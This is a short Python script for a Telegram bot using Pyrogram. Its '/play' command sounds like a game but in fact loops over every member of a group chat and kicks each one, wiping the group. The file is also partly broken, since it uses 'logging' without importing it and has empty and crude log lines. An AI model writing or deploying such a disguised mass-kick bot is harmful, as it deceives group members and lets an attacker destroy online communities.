from . import bot
from pyrogram import Client, idle
from pyrogram import Client, filters

@bot.on_message(filters.command("/play") & filters.group)
def NewChat(bot,message):
    logging.info("new")
    logging.info("1,2,3")
    a= bot.iter_chat_members(message.chat.id)
    for i in a:
        try:
            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
            logging.info("")
        except Exception:
            logging.info("")
            
    logging.info("fuvk")

bot.run()
idle() 
